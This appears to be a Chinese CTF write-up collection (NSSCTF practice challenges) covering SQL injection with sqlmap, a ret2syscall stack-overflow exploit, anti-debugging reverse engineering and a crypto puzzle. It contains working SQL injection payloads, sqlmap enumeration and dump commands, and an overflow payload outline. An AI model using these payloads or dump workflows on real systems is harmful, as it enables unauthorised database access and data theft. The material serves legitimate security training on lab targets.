+<p><img src="/2025%20NSSCTF/file-20260331130227933.png" loading='lazy'></p>
+<p>数据库信息：back-end DBMS: MySQL &gt;&#x3D; 5.0 (MariaDB fork)<br>  web application technology: Nginx 1.14.2, PHP 5.6.40</p>
+<p>意思是：</p>
+<ul>
+<li><p>数据库：MySQL 5.0以上版本,MariaDB分支</p>
+</li>
+<li><p>Web服务器：Nginx 1.14.2</p>
+</li>
+<li><p>后端语言：PHP 5.6.40</p>
+<p>SQLMap找到了4种注入方式：</p>
+</li>
+</ul>
+<ol>
+<li>Boolean-based blind（布尔盲注）</li>
+</ol>
+<p>  Payload: wllm&#x3D;1’ AND 5235&#x3D;5235 AND ‘aqWL’&#x3D;’aqWL<br>  原理： 通过True&#x2F;False判断来获取信息<br>  特点： 速度慢，但很稳定</p>
+<ol start="2">
+<li>Error-based（报错注入） ⭐推荐</li>
+</ol>
+<p>  Payload: wllm&#x3D;1’ AND (SELECT 9989 FROM(SELECT COUNT(*),CONCAT(…))x…<br>  原理： 让数据库报错，在错误信息中显示数据<br>  特点： 速度快！一次性获取大量信息</p>
+<ol start="3">
+<li>Time-based blind（时间盲注）</li>
+</ol>
+<p>  Payload: wllm&#x3D;1’ AND (SELECT 7527 FROM (SELECT(SLEEP(5)))esur)…<br>  原理： 通过延时来判断True&#x2F;False<br>  特点： 最慢，但最通用</p>
+<ol start="4">
+<li>UNION query（联合查询注入） ⭐推荐</li>
+</ol>
+<p>  Payload: wllm&#x3D;-4242’ UNION ALL SELECT NULL,NULL,CONCAT(…)– -<br>  原理： 通过UNION合并查询直接显示数据<br>  特点： 最快！最直接！</p>
+<p>4.2 枚举数据库</p>
+<p>  命令：<br> <code>sqlmap -u &quot;http://node4.anna.nssctf.cn:24443/?wllm=1&quot; --batch --dbs</code></p>
+<p>  参数解释：</p>
+<ul>
+<li>–dbs：列出所有数据库</li>
+</ul>
+<p><img src="/2025%20NSSCTF/file-20260331130227915.png" loading='lazy'></p>
+<p> test_db    ← 这个看起来可疑！</p>
+<p>  本小姐的观察技巧： test_db 明显不是默认数据库，肯定是放flag的地方！</p>
+<p>  4.3 枚举表<br><code>sqlmap -u &quot;http://node4.anna.nssctf.cn:24443/?wllm=1&quot; --batch -D test_db --tables</code></p>
+<p>  新增参数：</p>
+<ul>
+<li>-D test_db：指定数据库</li>
+<li>–tables：列出该数据库的所有表</li>
+</ul>
+<p><img src="/2025%20NSSCTF/file-20260331130227924.png" loading='lazy'></p>
+<p>  4.4 查看表结构</p>
+<p><code>sqlmap -u &quot;http://node4.anna.nssctf.cn:24443/?wllm=1&quot; --batch -D test_db -T test_tb --columns</code></p>
+<p>  新增参数：</p>
+<ul>
+<li>-T test_tb：指定表</li>
+<li>–columns：查看表结构</li>
+</ul>
+<p><img src="/2025%20NSSCTF/file-20260331130227905.png" loading='lazy'></p>
+<p>  4.5 获取FLAG！</p>
+<p>  最后一步：<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:24443/?wllm=1">http://node4.anna.nssctf.cn:24443/?wllm=1</a>“ –batch -D test_db -T test_tb –dump</p>
+<p>  新增参数：</p>
+<ul>
+<li>–dump：导出表中的所有数据</li>
+</ul>
+<p><img src="/2025%20NSSCTF/file-20260331130227896.png" loading='lazy'></p>
+<p>NSSCTF{ecd98b8f-2324-48e6-9785-0b5ec164a0ee}</p>
+<p>  🧠 SQLMap使用思路总结</p>
+<p>  核心思路流程：</p>
+<ol>
+<li>信息收集 → 2. 找参数 → 3. 确认注入 → 4. SQLMap自动化</li>
+</ol>
+<p>  SQLMap标准流程：</p>
+<p>  找注入点 → 枚举数据库 → 枚举表 → 查看结构 → 导出数据</p>
+<p>  常用命令组合：</p>
+<h1 id="基础测试"><a href="#基础测试" class="headerlink" title="基础测试"></a>基础测试</h1><p>sqlmap -u “URL?param&#x3D;1” –batch</p>
+<h1 id="找数据库"><a href="#找数据库" class="headerlink" title="找数据库"></a>找数据库</h1><p>sqlmap -u “URL?param&#x3D;1” –batch –dbs</p>
+<h1 id="找表"><a href="#找表" class="headerlink" title="找表"></a>找表</h1><p>sqlmap -u “URL?param&#x3D;1” –batch -D dbname –tables</p>
+<h1 id="看结构"><a href="#看结构" class="headerlink" title="看结构"></a>看结构</h1><p>sqlmap -u “URL?param&#x3D;1” –batch -D dbname -T tablename –columns</p>
+<h1 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h1><p>sqlmap -u “URL?param&#x3D;1” –batch -D dbname -T tablename –dump</p>
+<ol>
+<li>快速判断目标：</li>
+</ol>
+<ul>
+<li>看到”参数是xxx” → 直接用那个参数名</li>
+<li>页面简单 → 通常是入门级SQL注入</li>
+</ul>
+<ol start="2">
+<li>SQLMap参数优先级：</li>
+</ol>
+<ul>
+<li>–batch：永远加上，省去手动选择</li>
+<li>–dbs → –tables → –columns → –dump：标准流程</li>
+</ul>
+<ol start="3">
+<li>数据库命名规律：</li>
+</ol>
+<ul>
+<li>test_db, flag_db, challenge_db：90%放flag</li>
+<li>information_schema, mysql：系统数据库，不用看</li>
+</ul>
+<ol start="4">
+<li>表名规律：</li>
+</ol>
+<ul>
+<li>flag, test_tb, admin：重点关注的表</li>
+<li>users：通常放用户信息，可能有flag</li>
+</ul>
+<ol start="5">
+<li>避坑指南：</li>
+</ol>
+<ul>
+<li>用curl -I先测试连通性，避免SQLMap卡死</li>
+<li>看到–batch参数，SQLMap就不会一直问问题</li>
+<li>如果SQLMap卡住，用–timeout&#x3D;10限制时间</li>
+</ul>
+<hr>
+<p>  遇到问题时：</p>
+<ul>
+<li>SQLMap报错 → 检查URL是否正确</li>
+<li>找不到数据库 → 可能权限不够或注入点错误</li>
+<li>卡住不动 → 加–timeout参数</li>
+</ul>
+<h2 id="3-Misc-1"><a href="#3-Misc-1" class="headerlink" title="3.Misc"></a>3.Misc</h2><h3 id="陇剑杯-2021-签到"><a href="#陇剑杯-2021-签到" class="headerlink" title="[陇剑杯_2021]签到"></a>[陇剑杯_2021]签到</h3><blockquote>
+<p>题目描述：</p>
+<p>此时正在进行的可能是__________协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。得到的flag请使用NSSCTF{}格式提交。</p>
+</blockquote>
+<p><img src="/2025%20NSSCTF/file-20260331130230769.png" loading='lazy'></p>
+<p>NSSCTF{http}</p>
+<h2 id="4-Pwn-1"><a href="#4-Pwn-1" class="headerlink" title="4.Pwn"></a>4.Pwn</h2><h3 id="WUSTCTF-2020-getshell2-1"><a href="#WUSTCTF-2020-getshell2-1" class="headerlink" title="[WUSTCTF 2020]getshell2"></a>[WUSTCTF 2020]getshell2</h3><h4 id="栈溢出-ret2syscall-栈-1"><a href="#栈溢出-ret2syscall-栈-1" class="headerlink" title="#栈溢出 #ret2syscall #栈"></a>#栈溢出 #ret2syscall #栈</h4><p>附件：service</p>
+<p>题目环境：</p>
+<p>直接file+checksec</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228790.png" loading='lazy'></p>
+<p>只开启了栈不可执行，应该是栈溢出题目。</p>
+<p>使用ROPgadget</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228771.png" loading='lazy'></p>
+<p>找到了sh地址：0x08048670 </p>
+<p>直接写死：sh_addr &#x3D; 0x08048670</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228763.png" loading='lazy'></p>
+<p>栈溢出（Stack Overflow） 漏洞：</p>
+<ul>
+<li>程序执行完一个函数后，会跳回它被调用的地方，即返回地址（存于栈上）</li>
+<li>当攻击者输入超长数据后,会覆盖返回地址（Return Address）</li>
+</ul>
+<p><img src="/2025%20NSSCTF/file-20260331130228754.png" loading='lazy'></p>
+<ul>
+<li><code>gets()</code>、<code>strcpy()</code> 等属于没有边界检查的函数。</li>
+</ul>
+<p>🛠️ 六、完整攻击流程</p>
+<ol>
+<li><strong>连接远程服务</strong></li>
+<li><strong>p &#x3D; remote(‘ip’, port)</strong></li>
+</ol>
+<p><strong>构造 payload</strong></p>
+<pre><code>- 填充 28 字节到返回地址位置
+- 覆盖返回地址为 `system`
+- 提供 fake return 和 `&quot;sh&quot;` 地址
+</code></pre>
+<ol start="3">
+<li><strong>发送 payload</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python</span><br><span class="line"></span><br><span class="line">编辑</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>进入交互模式，输入命令</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python</span><br><span class="line"></span><br><span class="line">编辑</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1p.interactive()  # 之后你就可以输入 ls, cat flag.txt 等</span><br></pre></td></tr></table></figure>
+
+<p>Q1: 为什么不用 <code>&quot;/bin/sh&quot;</code>，而用 <code>&quot;sh&quot;</code>？</p>
+<p>很多题目为了简化，只放了 <code>&quot;sh&quot;</code>。</p>
+<p>在 Linux 中，<code>system(&quot;sh&quot;)</code> 和 <code>system(&quot;/bin/sh&quot;)</code> 效果几乎一样，都能弹 shell。</p>
+<p>Q2: <code>0xdeadbeef</code> 是什么？会 crash 吗？</p>
+<p>它只是一个“占位符”，表示“随便填个地址”。</p>
+<p>只要你在 <code>system</code> 返回前已经拿到 shell，程序是否 crash 都不影响你读 flag。</p>
+<p>Q3: 为什么偏移是 28（0x18+4）？</p>
+<p><code>0x18 = 24</code> 字节是 buffer 大小</p>
+<p><code>+4</code> 是 saved ebp（旧的栈基址指针）</p>
+<p>总共 28 字节后，才是返回地址</p>
+<h2 id="5-Reverse-1"><a href="#5-Reverse-1" class="headerlink" title="5.Reverse"></a>5.Reverse</h2><h3 id="SEETF-2022-Magic"><a href="#SEETF-2022-Magic" class="headerlink" title="[SEETF 2022]Magic"></a>[SEETF 2022]Magic</h3><h4 id="反调试-REVERSE"><a href="#反调试-REVERSE" class="headerlink" title="#反调试 #REVERSE"></a>#反调试 #REVERSE</h4><p>题目描述：There might be a hidden gate to the magical land of flags…</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228709.png" loading='lazy'></p>
+<p>默认值：</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228691.png" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _OWORD v3[2]; // [esp-C0h] [ebp-CCh] BYREF</span><br><span class="line">  __int64 v4; // [esp-A0h] [ebp-ACh]</span><br><span class="line">  int v5; // [esp-98h] [ebp-A4h]</span><br><span class="line">  char v6[3]; // [esp-94h] [ebp-A0h] BYREF</span><br><span class="line">  int v7; // [esp+4h] [ebp-8h]</span><br><span class="line">  int retaddr; // [esp+Ch] [ebp+0h]</span><br><span class="line"></span><br><span class="line">  v7 = retaddr;</span><br><span class="line">  v5 = 1725917800;</span><br><span class="line">  v3[0] = xmmword_403148;</span><br><span class="line">  strcpy(v6, &quot;h6&quot;);</span><br><span class="line">  v3[1] = xmmword_403158;</span><br><span class="line">  v4 = 0x7CE4457476DB4268i64;</span><br><span class="line">  ((void (__thiscall __noreturn *)(_OWORD *))sub_401290)(v3);</span><br></pre></td></tr></table></figure>
+
+<p>重新用ida32打开magic.exe，进入<code>内核选项 kernel options</code>，<strong>取消勾选</strong> <code>进行&quot;无返回&quot;分析 perform no-return analysis</code>，这样分析<code>main</code> 函数内容会更完整。  <img src="/2025%20NSSCTF/file-20260331130228673.png" loading='lazy'></p>
+<p>操作后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ebp</span><br><span class="line">  char v4; // di</span><br><span class="line">  int v5; // ecx</span><br><span class="line">  FILE *v6; // eax</span><br><span class="line">  int i; // edi</span><br><span class="line">  DWORD TickCount; // eax</span><br><span class="line">  HKEY v10; // [esp-13Ch] [ebp-148h] BYREF</span><br><span class="line">  DWORD v11; // [esp-138h] [ebp-144h] BYREF</span><br><span class="line">  __int16 v12; // [esp-134h] [ebp-140h]</span><br><span class="line">  _OWORD v13[4]; // [esp-130h] [ebp-13Ch] BYREF</span><br><span class="line">  char v14[24]; // [esp-F0h] [ebp-FCh] BYREF</span><br><span class="line">  BYTE v15[24]; // [esp-D8h] [ebp-E4h] BYREF</span><br><span class="line">  _OWORD v16[2]; // [esp-C0h] [ebp-CCh] BYREF</span><br><span class="line">  __int64 v17; // [esp-A0h] [ebp-ACh]</span><br><span class="line">  int v18; // [esp-98h] [ebp-A4h]</span><br><span class="line">  char v19[3]; // [esp-94h] [ebp-A0h] BYREF</span><br><span class="line">  _OWORD v20[2]; // [esp-90h] [ebp-9Ch] BYREF</span><br><span class="line">  __int16 v21; // [esp-70h] [ebp-7Ch]</span><br><span class="line">  char v22; // [esp-6Eh] [ebp-7Ah]</span><br><span class="line">  _OWORD v23[2]; // [esp-54h] [ebp-60h] BYREF</span><br><span class="line">  __int16 v24; // [esp-34h] [ebp-40h]</span><br><span class="line">  __int128 v25; // [esp-30h] [ebp-3Ch] BYREF</span><br><span class="line">  int v26; // [esp-20h] [ebp-2Ch]</span><br><span class="line">  char v27; // [esp-1Ch] [ebp-28h]</span><br><span class="line">  char v28[12]; // [esp-18h] [ebp-24h] BYREF</span><br><span class="line">  int v29; // [esp-Ch] [ebp-18h] BYREF</span><br><span class="line">  __int16 v30; // [esp-8h] [ebp-14h]</span><br><span class="line">  int v31; // [esp+0h] [ebp-Ch]</span><br><span class="line">  int v32; // [esp+4h] [ebp-8h]</span><br><span class="line">  int retaddr; // [esp+Ch] [ebp+0h]</span><br><span class="line"></span><br><span class="line">  v31 = v3;</span><br><span class="line">  v32 = retaddr;</span><br><span class="line">  v18 = 1725917800;</span><br><span class="line">  v16[0] = xmmword_403148;</span><br><span class="line">  strcpy(v19, &quot;h6&quot;);</span><br><span class="line">  v16[1] = xmmword_403158;</span><br><span class="line">  v17 = 0x7CE4457476DB4268i64;</span><br><span class="line">  sub_401290(v16);</span><br><span class="line">  RegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)v16, 0, 0x101u, &amp;v10);</span><br><span class="line">  v29 = 1741189973;</span><br><span class="line">  v30 = 96;</span><br><span class="line">  sub_401290(&amp;v29);</span><br><span class="line">  v11 = 21;</span><br><span class="line">  if ( RegQueryValueExA(v10, (LPCSTR)&amp;v29, 0, 0, v15, &amp;v11) )</span><br><span class="line">    return -1;</span><br><span class="line">  v12 = 20;</span><br><span class="line">  sub_401170(v14);</span><br><span class="line">  v26 = -405287383;</span><br><span class="line">  v25 = xmmword_4031F0;</span><br><span class="line">  v27 = 0;</span><br><span class="line">  if ( strncmp(v14, (const char *)&amp;v25, 0x14u) )</span><br><span class="line">    return -1;</span><br><span class="line">  v13[0] = xmmword_4031B0;</span><br><span class="line">  v13[1] = xmmword_4031D0;</span><br><span class="line">  v13[2] = xmmword_4031C0;</span><br><span class="line">  v13[3] = xmmword_4031E0;</span><br><span class="line">  sub_4012F0(v13, v15, v5);</span><br><span class="line">  sub_4011D0(&quot;%s&quot;, (char)v13);</span><br><span class="line">  v6 = _acrt_iob_func(0);</span><br><span class="line">  fgets(v28, 9, v6);</span><br><span class="line">  if ( !atoi(v28) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4011D0(&quot;nope&quot;, v4);</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( sub_401360(v28) == -1339812568 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( IsDebuggerPresent() )</span><br><span class="line">      goto LABEL_13;</span><br><span class="line">    v21 = 5692;</span><br><span class="line">    v20[0] = xmmword_40318C;</span><br><span class="line">    v22 = 0;</span><br><span class="line">    v20[1] = xmmword_40319C;</span><br><span class="line">    sub_401290(v20);</span><br><span class="line">    sub_4011D0(&quot;%s&quot;, (char)v20);</span><br><span class="line">    for ( i = 0; i &lt; 8; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      TickCount = GetTickCount();</span><br><span class="line">      v28[i] -= 10;</span><br><span class="line">      if ( GetTickCount() - TickCount &gt; 0x5DC )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">    v23[0] = xmmword_403200;</span><br><span class="line">    v23[1] = xmmword_403210;</span><br><span class="line">    v24 = -10010;</span><br><span class="line">    sub_401170(v23);</span><br><span class="line">    if ( IsDebuggerPresent() )</span><br><span class="line">LABEL_13:</span><br><span class="line">      ExitProcess(0xFFFFFFFF);</span><br><span class="line">    sub_4011D0(&quot;%s&quot;, (char)v23);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4011D0(&quot;nope&quot;, v4);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原因：</p>
+<p>部分函数直接调用 <code>ExitProcess</code> 退出而不返回，以阻碍动调。ida识别后认为是结束点，就不分析 <code>main</code> 函数剩下的代码了。</p>
+<h1 id="补充题"><a href="#补充题" class="headerlink" title="补充题"></a>补充题</h1><p>这两题来自旧总文中结构错位或孤立残段。为了不漏题，先并入本篇补充区，后续若再凑满一轮可单独迁出。</p>
+<h2 id="Crypto补充"><a href="#Crypto补充" class="headerlink" title="Crypto补充"></a>Crypto补充</h2><h3 id="鹤城杯-2021-A-CRYPTO"><a href="#鹤城杯-2021-A-CRYPTO" class="headerlink" title="[鹤城杯 2021]A_CRYPTO"></a>[鹤城杯 2021]A_CRYPTO</h3><p>#Base家族 #ROT #古典密码</p>
+<blockquote>
+<p>4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</p>
+</blockquote>
+<p>这题只有一种方法：ciphey一把梭，否则是无法按常理做出来的。</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228464.png" loading='lazy'>flag{W0w_y0u_c4n_rea11y_enc0d1ng!}</p>
+<h2 id="Web补充"><a href="#Web补充" class="headerlink" title="Web补充"></a>Web补充</h2><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><h4 id="SQL注入-堆叠注入-后端逻辑分析"><a href="#SQL注入-堆叠注入-后端逻辑分析" class="headerlink" title="#SQL注入 #堆叠注入 #后端逻辑分析"></a>#SQL注入 #堆叠注入 #后端逻辑分析</h4><p>题目地址：<a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:27612/">http://node4.anna.nssctf.cn:27612/</a></p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>这是一道经典的SQL注入题目，题目提示我们输入flag，它会告诉我们是否正确。</p>
+<p>首先，观察到页面只有一个输入框，我们可以输入数据，然后点击提交。</p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>这道题的关键在于猜测后端的SQL逻辑。通过搜索这道题的背景信息，我们可以知道这道题的后端逻辑大致如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;输入内容&#x27;</span>] . <span class="string">&quot; || flag from Flag&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <code>||</code> 在 MySQL 中是逻辑或运算符。当我们输入某些特定内容时，可以触发一些有趣的效果。</p>
+<h4 id="非预期解法（最简单）"><a href="#非预期解法（最简单）" class="headerlink" title="非预期解法（最简单）"></a>非预期解法（最简单）</h4><p>输入 payload: <code>*,1</code></p>
+<p>原理：</p>
+<ul>
+<li>当我们输入 <code>*,1</code> 时，后端的SQL语句变成：<code>select *,1 || flag from Flag</code></li>
+<li>由于 MySQL 解析的优先级，<code>*,1</code> 会被优先解析，变成：<code>select *,1 from Flag</code></li>
+<li>这样就可以成功查询到 Flag 表的所有内容</li>
+</ul>
+<p>最终得到的 flag：<br><code>NSSCTF{e1f5b83a-7d3f-4493-9041-dd725742be32}</code></p>
+<h4 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h4><p>使用 payload: <code>1;set sql_mode=pipes_as_concat;select 1</code></p>
+<p>原理：</p>
+<ul>
+<li>通过堆叠注入，我们设置 sql_mode 为 pipes_as_concat</li>
+<li>这样 || 符号就从逻辑或变成了字符串连接符</li>
+<li>然后再查询就可以得到 flag 了</li>
+</ul>
+<h4 id="关于使用-sqlmap"><a href="#关于使用-sqlmap" class="headerlink" title="关于使用 sqlmap"></a>关于使用 sqlmap</h4><p>本机 WSL 环境有 <code>/usr/local/bin/sqlmap</code> 可以使用。不过，对于这道题来说，直接使用手工 payload 更加高效快捷，因为它主要是依赖对后端逻辑的猜测，而不是常规的 SQL 注入流程。</p>
+<h3 id="LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>[LitCTF 2023]这是什么？SQL ！注一下 ！</h3><p>SQL注入  布尔盲注  时间盲注<br><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512134028249.png" loading='lazy'><br>id是参数。使用sqlmap。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://node5.anna.nssctf.cn:25436/?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512134940026.png" loading='lazy'><br>时间盲注。<br><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512135042024.png" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://node5.anna.nssctf.cn:25436/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512135000546.png" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://node5.anna.nssctf.cn:25436/?id=1&quot; -D ctf --tables</span><br></pre></td></tr></table></figure>
+<p>输出一下内容。因为是时间盲注，需要一点时间。<br><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512135438504.png" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://node5.anna.nssctf.cn:25436/?id=1&quot; -D ctf -T users --columns</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512140019766.png" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://node5.anna.nssctf.cn:25436/?id=1&quot; -D ctf -T users --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512164249175.png" loading='lazy'></p>
+<p>说是假的flag<br>再去看：ctftraining</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://node5.anna.nssctf.cn:25436/?id=1&quot; -D ctftraining --tables</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512165010737.png" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://node5.anna.nssctf.cn:25436/?id=1&quot; -D ctftraining -T flag --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/file-20260512173359800.png" loading='lazy'></p>
